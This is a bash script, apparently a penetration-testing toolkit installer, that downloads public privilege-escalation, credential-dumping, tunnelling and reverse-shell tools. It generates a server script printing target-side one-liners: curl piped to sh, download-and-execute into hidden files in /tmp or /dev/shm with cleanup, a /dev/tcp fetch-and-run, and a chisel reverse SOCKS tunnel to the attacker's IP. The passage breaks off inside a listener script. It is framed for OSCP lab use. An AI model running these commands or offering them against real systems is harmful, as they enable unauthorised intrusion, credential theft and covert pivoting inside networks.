#!/bin/bash

#=============================================================================
# LINUX-ARSENAL v2.0 - Enhanced Edition
# Author: @mahdiesta
# Description: Intelligent Linux Pentesting Tools Downloader with Smart One-liners
# OSCP/OSCP+ Compliant - Enumeration Only, No Auto-Exploitation
#=============================================================================

# Colors
R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
B='\033[0;34m'
P='\033[0;35m'
C='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULT_TOOLS_DIR="${HOME}/linux-arsenal"
TOOLS_DIR="${1:-$DEFAULT_TOOLS_DIR}"
VERSION="2.0-enhanced"
AUTHOR="@mahdiesta"

# Create directories
mkdir -p "${TOOLS_DIR}" 2>/dev/null
TEMP_DIR="${TOOLS_DIR}/.tmp"
LOG_FILE="${TOOLS_DIR}/.download.log"
mkdir -p "${TEMP_DIR}" 2>/dev/null
touch "${LOG_FILE}" 2>/dev/null

#=============================================================================
# HELPER FUNCTIONS
#=============================================================================

log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    [ -f "${LOG_FILE}" ] && echo "${timestamp} [${level}] ${message}" >> "${LOG_FILE}" 2>/dev/null
    
    case "$level" in
        "INFO")   echo -e "${G}[✓]${NC} ${message}" ;;
        "WARN")   echo -e "${Y}[!]${NC} ${message}" ;;
        "ERROR")  echo -e "${R}[✗]${NC} ${message}" ;;
        "DEBUG")  echo -e "${B}[*]${NC} ${message}" ;;
        "HEADER") echo -e "\n${P}━━━${NC} ${message}" ;;
    esac
}

check_dependencies() {
    log "HEADER" "Checking Dependencies"
    
    local deps=("curl" "wget" "git" "unzip" "gunzip" "tar")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        log "WARN" "Missing: ${missing[*]}"
        log "INFO" "Installing..."
        sudo apt-get update -qq 2>/dev/null
        sudo apt-get install -y -qq "${missing[@]}" 2>/dev/null
    fi
    
    log "INFO" "Dependencies OK"
}

create_directories() {
    log "HEADER" "Creating Directory Structure"
    
    local dirs=(
        "enumeration"
        "privesc"
        "exploit-suggesters"
        "command-generators"
        "process-monitor"
        "tunneling"
        "shells"
        "transfer"
        "persistence"
        "credentials"
        "network"
        "cheatsheets"
        "python-tools"
        "wordlists"
        "static-binaries"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "${TOOLS_DIR}/${dir}"
    done
    
    log "INFO" "Directories created"
}

download_file() {
    local url="$1"
    local output="$2"
    local name="$3"
    
    if [ -z "$url" ]; then
        return 1
    fi
    
    if curl -sL --connect-timeout 15 --max-time 120 -o "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    if wget -q --timeout=15 -O "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then
            log "INFO" "Downloaded: ${name}"
            return 0
        fi
    fi
    
    rm -f "${output}" 2>/dev/null
    log "WARN" "Failed: ${name}"
    return 1
}

download_with_fallback() {
    local name="$1"
    local output="$2"
    shift 2
    local urls=("$@")
    
    for url in "${urls[@]}"; do
        if download_file "$url" "$output" "$name"; then
            return 0
        fi
    done
    
    log "WARN" "All URLs failed: ${name}"
    return 1
}

git_clone() {
    local repo="$1"
    local dest="$2"
    local name="$3"
    
    if [ -d "${dest}" ]; then
        log "INFO" "${name} (exists)"
        return 0
    fi
    
    if git clone --depth 1 "${repo}" "${dest}" 2>/dev/null; then
        log "INFO" "${name}"
        return 0
    else
        log "WARN" "Failed to clone: ${name}"
        return 1
    fi
}

#=============================================================================
# DOWNLOAD FUNCTIONS
#=============================================================================

download_enumeration_scripts() {
    log "HEADER" "Downloading Enumeration Scripts"
    
    local enum="${TOOLS_DIR}/enumeration"
    local priv="${TOOLS_DIR}/privesc"
    local exp="${TOOLS_DIR}/exploit-suggesters"
    local proc="${TOOLS_DIR}/process-monitor"
    
    # TIER 1: PRIMARY ENUMERATION
    log "DEBUG" "Tier 1: Primary Enumeration Tools"
    
    download_with_fallback "linpeas.sh" "${enum}/linpeas.sh" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_fat.sh"
    chmod +x "${enum}/linpeas.sh" 2>/dev/null
    
    download_file "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_small.sh" \
        "${enum}/linpeas_small.sh" "linpeas_small.sh"
    chmod +x "${enum}/linpeas_small.sh" 2>/dev/null
    
    download_file "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" \
        "${enum}/lse.sh" "lse.sh"
    chmod +x "${enum}/lse.sh" 2>/dev/null
    
    download_file "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" \
        "${enum}/LinEnum.sh" "LinEnum.sh"
    chmod +x "${enum}/LinEnum.sh" 2>/dev/null
    
    # TIER 2: SPECIALIZED ENUMERATION
    log "DEBUG" "Tier 2: Specialized Enumeration"
    
    download_file "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" \
        "${enum}/linuxprivchecker.py" "linuxprivchecker.py"
    
    download_file "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check" \
        "${enum}/unix-privesc-check" "unix-privesc-check"
    chmod +x "${enum}/unix-privesc-check" 2>/dev/null
    
    git_clone "https://github.com/TH3xACE/SUDO_KILLER.git" "${priv}/SUDO_KILLER" "SUDO_KILLER"
    
    download_file "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" \
        "${priv}/suid3num.py" "suid3num.py"
    
    # TIER 3: EXPLOIT SUGGESTERS
    log "DEBUG" "Tier 3: Exploit Suggesters"
    
    download_file "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" \
        "${exp}/linux-exploit-suggester.sh" "linux-exploit-suggester.sh"
    chmod +x "${exp}/linux-exploit-suggester.sh" 2>/dev/null
    
    download_file "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" \
        "${exp}/linux-exploit-suggester-2.pl" "linux-exploit-suggester-2.pl"
    
    git_clone "https://github.com/mzet-/linux-exploit-suggester.git" "${exp}/les-ng" "LES-NG"
    
    # TIER 4: PROCESS MONITORING
    log "DEBUG" "Tier 4: Process Monitoring"
    
    download_with_fallback "pspy64" "${proc}/pspy64" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
    chmod +x "${proc}/pspy64" 2>/dev/null
    
    download_with_fallback "pspy32" "${proc}/pspy32" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32"
    chmod +x "${proc}/pspy32" 2>/dev/null
    
    download_with_fallback "pspy64s" "${proc}/pspy64s" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s"
    chmod +x "${proc}/pspy64s" 2>/dev/null
    
    download_with_fallback "pspy32s" "${proc}/pspy32s" \
        "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s" \
        "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32s"
    chmod +x "${proc}/pspy32s" 2>/dev/null
}

download_privesc_tools() {
    log "HEADER" "Downloading PrivEsc Tools"
    
    local priv="${TOOLS_DIR}/privesc"
    local cred="${TOOLS_DIR}/credentials"
    local cmd_gen="${TOOLS_DIR}/command-generators"
    
    mkdir -p "${cmd_gen}" 2>/dev/null
    
    log "DEBUG" "Command Generators (OSCP-safe)"
    
    git_clone "https://github.com/nccgroup/GTFOBLookup.git" "${cmd_gen}/GTFOBLookup" "GTFOBLookup"
    git_clone "https://github.com/IvanGlinkin/LinEsc.git" "${cmd_gen}/LinEsc" "LinEsc"
    
    download_file "https://raw.githubusercontent.com/Frissi0n/GTFONow/main/gtfonow.py" \
        "${cmd_gen}/gtfonow.py" "GTFONow"
    
    download_file "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" \
        "${cmd_gen}/suid3num.py" "suid3num.py"
    
    log "DEBUG" "Specialized PrivEsc Tools"
    
    git_clone "https://github.com/GTFOBins/GTFOBins.github.io.git" "${priv}/GTFOBins" "GTFOBins"
    git_clone "https://github.com/LOLBAS-Project/LOLBAS.git" "${priv}/LOLBAS" "LOLBAS"
    
    download_with_fallback "traitor-amd64" "${priv}/traitor-amd64" \
        "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64" \
        "https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64"
    chmod +x "${priv}/traitor-amd64" 2>/dev/null
    
    download_with_fallback "traitor-386" "${priv}/traitor-386" \
        "https://github.com/liamg/traitor/releases/latest/download/traitor-386" \
        "https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-386"
    chmod +x "${priv}/traitor-386" 2>/dev/null
    
    git_clone "https://github.com/AlessandroZ/BeRoot.git" "${priv}/BeRoot" "BeRoot"
    
    download_file "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_darwin_amd64" \
        "${priv}/linpeas_macos" "linpeas_macos"
    chmod +x "${priv}/linpeas_macos" 2>/dev/null
    
    git_clone "https://github.com/AlessandroZ/LaZagne.git" "${cred}/LaZagne" "LaZagne"
    git_clone "https://github.com/huntergregal/mimipenguin.git" "${cred}/mimipenguin" "mimipenguin"
}

download_tunneling_tools() {
    log "HEADER" "Downloading Tunneling Tools"
    
    local tun="${TOOLS_DIR}/tunneling"
    
    download_with_fallback "chisel_linux_amd64" "${TEMP_DIR}/chisel_linux.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz"
    [ -f "${TEMP_DIR}/chisel_linux.gz" ] && gunzip -c "${TEMP_DIR}/chisel_linux.gz" > "${tun}/chisel" 2>/dev/null
    chmod +x "${tun}/chisel" 2>/dev/null
    
    download_with_fallback "chisel_linux_386" "${TEMP_DIR}/chisel_linux_386.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_386.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_386.gz"
    [ -f "${TEMP_DIR}/chisel_linux_386.gz" ] && gunzip -c "${TEMP_DIR}/chisel_linux_386.gz" > "${tun}/chisel_386" 2>/dev/null
    chmod +x "${tun}/chisel_386" 2>/dev/null
    
    download_with_fallback "ligolo_proxy" "${TEMP_DIR}/ligolo_proxy.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz"
    [ -f "${TEMP_DIR}/ligolo_proxy.tar.gz" ] && tar -xzf "${TEMP_DIR}/ligolo_proxy.tar.gz" -C "${tun}/" 2>/dev/null
    
    download_with_fallback "ligolo_agent" "${TEMP_DIR}/ligolo_agent.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz"
    [ -f "${TEMP_DIR}/ligolo_agent.tar.gz" ] && tar -xzf "${TEMP_DIR}/ligolo_agent.tar.gz" -C "${tun}/" 2>/dev/null
    
    cat > "${tun}/proxychains.conf" << 'EOF'
# ProxyChains config for SOCKS proxy
strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
EOF
    log "INFO" "Created proxychains.conf"
}

download_shells_and_transfer() {
    log "HEADER" "Downloading Shells & Transfer Tools"
    
    local shells="${TOOLS_DIR}/shells"
    local transfer="${TOOLS_DIR}/transfer"
    
    git_clone "https://github.com/mthbernardes/rsg.git" "${shells}/rsg" "Reverse Shell Generator"
    
    download_file "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" \
        "${shells}/php-reverse-shell.php" "php-reverse-shell.php"
    
    download_file "https://raw.githubusercontent.com/pentestmonkey/perl-reverse-shell/master/perl-reverse-shell.pl" \
        "${shells}/perl-reverse-shell.pl" "perl-reverse-shell.pl"
    
    download_file "https://raw.githubusercontent.com/pentestmonkey/python-pty-shells/master/tcp_pty_backconnect.py" \
        "${shells}/python-pty-shell.py" "python-pty-shell.py"
    
    git_clone "https://github.com/BlackArch/webshells.git" "${shells}/webshells" "webshells"
    
    download_file "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" \
        "${transfer}/ncat" "ncat"
    chmod +x "${transfer}/ncat" 2>/dev/null
    
    download_file "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" \
        "${transfer}/socat" "socat"
    chmod +x "${transfer}/socat" 2>/dev/null
}

download_static_binaries() {
    log "HEADER" "Downloading Static Binaries"
    
    local static="${TOOLS_DIR}/static-binaries"
    
    log "DEBUG" "Static binaries for restricted environments"
    
    download_with_fallback "bash" "${static}/bash" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/bash" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/bash"
    chmod +x "${static}/bash" 2>/dev/null
    
    download_with_fallback "busybox" "${static}/busybox" \
        "https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/busybox" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/busybox"
    chmod +x "${static}/busybox" 2>/dev/null
    
    download_with_fallback "curl" "${static}/curl" \
        "https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64" \
        "https://github.com/moparisthebest/static-curl/releases/download/v8.5.0/curl-amd64" \
        "https://github.com/dtschan/curl-static/releases/download/v7.63.0/curl"
    chmod +x "${static}/curl" 2>/dev/null
    
    download_with_fallback "nmap" "${static}/nmap" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/nmap"
    chmod +x "${static}/nmap" 2>/dev/null
    
    download_with_fallback "socat" "${static}/socat" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/socat"
    chmod +x "${static}/socat" 2>/dev/null
    
    download_with_fallback "ncat" "${static}/ncat" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/ncat"
    chmod +x "${static}/ncat" 2>/dev/null
    
    download_with_fallback "gdb" "${static}/gdb" \
        "https://github.com/hugsy/gdb-static/releases/download/v14.2/gdb-x86_64" \
        "https://github.com/hugsy/gdb-static/releases/download/v12.1/gdb-x86_64"
    chmod +x "${static}/gdb" 2>/dev/null
    
    download_with_fallback "tcpdump" "${static}/tcpdump" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/tcpdump" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/tcpdump"
    chmod +x "${static}/tcpdump" 2>/dev/null
    
    download_with_fallback "strace" "${static}/strace" \
        "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/strace" \
        "https://github.com/polaco1782/static-binaries/raw/master/x86_64/strace"
    chmod +x "${static}/strace" 2>/dev/null
}

download_network_tools() {
    log "HEADER" "Downloading Network Tools"
    
    local net="${TOOLS_DIR}/network"
    
    git_clone "https://github.com/lgandx/Responder.git" "${net}/Responder" "Responder"
    git_clone "https://github.com/cddmp/enum4linux-ng.git" "${net}/enum4linux-ng" "enum4linux-ng"
    git_clone "https://github.com/Pennyw0rth/NetExec.git" "${net}/NetExec" "NetExec"
    git_clone "https://github.com/fortra/impacket.git" "${net}/impacket" "impacket"
}

clone_useful_repos() {
    log "HEADER" "Cloning Reference Repositories"
    
    local py="${TOOLS_DIR}/python-tools"
    
    git_clone "https://github.com/swisskyrepo/PayloadsAllTheThings.git" "${py}/PayloadsAllTheThings" "PayloadsAllTheThings"
    
    mkdir -p "${TOOLS_DIR}/wordlists" 2>/dev/null
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" \
        "${TOOLS_DIR}/wordlists/10k-passwords.txt" "10k-passwords.txt"
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt" \
        "${TOOLS_DIR}/wordlists/usernames.txt" "usernames.txt"
    
    git_clone "https://github.com/carlospolop/hacktricks.git" "${py}/hacktricks" "HackTricks"
}

#=============================================================================
# SMART SERVER SCRIPTS - Enhanced by @mahdiesta
#=============================================================================

create_server_scripts() {
    log "HEADER" "Creating Enhanced Server Scripts"
    
    # Smart HTTP Server with Intelligent One-liners
    cat > "${TOOLS_DIR}/serve.sh" << 'HTTPEOF'
#!/bin/bash
#=============================================================================
# Smart HTTP Server - Enhanced by @mahdiesta
# Serves tools with intelligent one-liners that auto-detect writable locations
#=============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT_FILE="${SCRIPT_DIR}/.http_port"

get_random_port() { echo $((RANDOM % 2000 + 8000)); }

is_port_free() {
    local port=$1
    ! (ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null) | grep -q ":${port} "
}

find_free_port() {
    local port=$1
    local max_attempts=50
    local attempt=0
    
    while [ $attempt -lt $max_attempts ]; do
        if is_port_free $port; then
            echo $port
            return 0
        fi
        port=$((port + 1))
        attempt=$((attempt + 1))
    done
    get_random_port
}

get_ip() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "127.0.0.1"
}

cleanup() { rm -f "${PORT_FILE}" 2>/dev/null; }
trap cleanup EXIT

REQUESTED_PORT="${1:-$(get_random_port)}"
PORT=$(find_free_port $REQUESTED_PORT)
IP=$(get_ip)

echo "${PORT}" > "${PORT_FILE}"

if [ "$PORT" != "$REQUESTED_PORT" ] && [ -n "$1" ]; then
    echo "[!] Port $REQUESTED_PORT in use, using $PORT"
fi

clear
cat << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  LINUX ARSENAL - Smart HTTP Server
  Enhanced by @mahdiesta
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Server:  http://${IP}:${PORT}/
  Serving: ${SCRIPT_DIR}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  INTELLIGENT ONE-LINERS FOR TARGET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

These commands automatically:
  • Find writable directories (/tmp, /dev/shm, /var/tmp, home dir)
  • Download and execute with proper permissions
  • Clean up after execution (optional)
  • Work without hardcoded paths

━━━ ENUMERATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LinPEAS (Primary - Run First)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Smart: Auto-finds writable dir, downloads, executes, cleans up
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/enumeration/linpeas.sh -o .lp.\$\$ && chmod +x .lp.\$\$ && ./.lp.\$\$ && rm -f .lp.\$\$)

# Memory execution (no files on disk)
curl -sL http://${IP}:${PORT}/enumeration/linpeas.sh | sh

# Save output to file
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/enumeration/linpeas.sh -o .lp.\$\$ && chmod +x .lp.\$\$ && ./.lp.\$\$ | tee linpeas_\$(date +%s).txt && rm -f .lp.\$\$)

# Alternative with wget
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && wget -q http://${IP}:${PORT}/enumeration/linpeas.sh -O .lp.\$\$ && chmod +x .lp.\$\$ && ./.lp.\$\$ && rm -f .lp.\$\$)

LinPEAS Small (Faster, minimal output)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/enumeration/linpeas_small.sh -o .lps.\$\$ && chmod +x .lps.\$\$ && ./.lps.\$\$ && rm -f .lps.\$\$)

LSE - Linux Smart Enumeration
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Level 1 (recommended)
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/enumeration/lse.sh -o .lse.\$\$ && chmod +x .lse.\$\$ && ./.lse.\$\$ -l1 && rm -f .lse.\$\$)

# Level 2 (full dump)
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/enumeration/lse.sh -o .lse.\$\$ && chmod +x .lse.\$\$ && ./.lse.\$\$ -l2 && rm -f .lse.\$\$)

LinEnum
━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/enumeration/LinEnum.sh -o .le.\$\$ && chmod +x .le.\$\$ && ./.le.\$\$ && rm -f .le.\$\$)

━━━ PROCESS MONITORING (Find Cron Jobs) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

pspy64 (64-bit) - CRITICAL for finding hidden cron jobs
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/process-monitor/pspy64 -o .pspy.\$\$ && chmod +x .pspy.\$\$ && ./.pspy.\$\$)

# With file events
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/process-monitor/pspy64 -o .pspy.\$\$ && chmod +x .pspy.\$\$ && ./.pspy.\$\$ -pf -i 1000)

pspy32 (32-bit)
━━━━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/process-monitor/pspy32 -o .pspy.\$\$ && chmod +x .pspy.\$\$ && ./.pspy.\$\$)

━━━ EXPLOIT SUGGESTERS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Linux Exploit Suggester
━━━━━━━━━━━━━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/exploit-suggesters/linux-exploit-suggester.sh -o .les.\$\$ && chmod +x .les.\$\$ && ./.les.\$\$ && rm -f .les.\$\$)

Linux Exploit Suggester 2 (Perl)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/exploit-suggesters/linux-exploit-suggester-2.pl -o .les2.\$\$ && perl .les2.\$\$ && rm -f .les2.\$\$)

━━━ COMMAND GENERATORS (OSCP Safe - Shows exploit commands) ━━━━━━━━━━━━━━━

suid3num - SUID finder + GTFOBins commands
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/command-generators/suid3num.py -o .suid.\$\$ && python3 .suid.\$\$ && rm -f .suid.\$\$)

GTFONow - Safe enumeration (level 0 only!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  WARNING: Only use -l 0 for OSCP compliance
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/command-generators/gtfonow.py -o .gtfo.\$\$ && python3 .gtfo.\$\$ -l 0 && rm -f .gtfo.\$\$)

traitor - Find vulnerabilities (no auto-exploit)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  WARNING: Don't use -a flag (auto-exploit)
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/privesc/traitor-amd64 -o .traitor.\$\$ && chmod +x .traitor.\$\$ && ./.traitor.\$\$ && rm -f .traitor.\$\$)

━━━ TUNNELING / PIVOTING ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Chisel - SOCKS proxy for pivoting
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Download and setup
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/tunneling/chisel -o .chisel.\$\$ && chmod +x .chisel.\$\$ && ./.chisel.\$\$ client ${IP}:8080 R:socks)

# 32-bit version
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/tunneling/chisel_386 -o .chisel.\$\$ && chmod +x .chisel.\$\$ && ./.chisel.\$\$ client ${IP}:8080 R:socks)

━━━ STATIC BINARIES (Restricted shells) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Static ncat (netcat)
━━━━━━━━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/transfer/ncat -o .nc.\$\$ && chmod +x .nc.\$\$)

Static socat
━━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/transfer/socat -o .socat.\$\$ && chmod +x .socat.\$\$)

Static bash
━━━━━━━━━━━
(cd \$(find /tmp /dev/shm /var/tmp ~ -maxdepth 0 -writable -type d 2>/dev/null | head -1) && curl -sL http://${IP}:${PORT}/static-binaries/bash -o .bash.\$\$ && chmod +x .bash.\$\$ && ./.bash.\$\$)

━━━ ALTERNATIVE DOWNLOAD METHODS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If curl/wget not available:
━━━━━━━━━━━━━━━━━━━━━━━━━━
# Using /dev/tcp (bash builtin)
exec 3<>/dev/tcp/${IP}/${PORT} && echo -e "GET /enumeration/linpeas.sh HTTP/1.1\r\nHost: ${IP}\r\n\r\n" >&3 && cat <&3 > /tmp/.lp && chmod +x /tmp/.lp && /tmp/.lp

# Using fetch (FreeBSD/OpenBSD)
fetch http://${IP}:${PORT}/enumeration/linpeas.sh -o /tmp/.lp && chmod +x /tmp/.lp && /tmp/.lp

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Server starting on port ${PORT}...
  Press Ctrl+C to stop
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

cd "${SCRIPT_DIR}"

if command -v python3 &>/dev/null; then
    python3 -m http.server ${PORT}
elif command -v python2 &>/dev/null; then
    python2 -m SimpleHTTPServer ${PORT}
elif command -v python &>/dev/null; then
    python -m http.server ${PORT} 2>/dev/null || python -m SimpleHTTPServer ${PORT}
elif command -v php &>/dev/null; then
    php -S 0.0.0.0:${PORT}
else
    echo "[-] No HTTP server available. Install python3."
    exit 1
fi
HTTPEOF
    chmod +x "${TOOLS_DIR}/serve.sh"

    # Smart listener
    cat > "${TOOLS_DIR}/listen.sh" << 'EOF'
#!/bin/bash
#=============================================================================
# Smart Listener - Enhanced by @mahdiesta
#=============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT_FILE="${SCRIPT_DIR}/.http_port"

is_port_free() {
    ! (ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null) | grep -q ":${1} "
}

get_ip() {
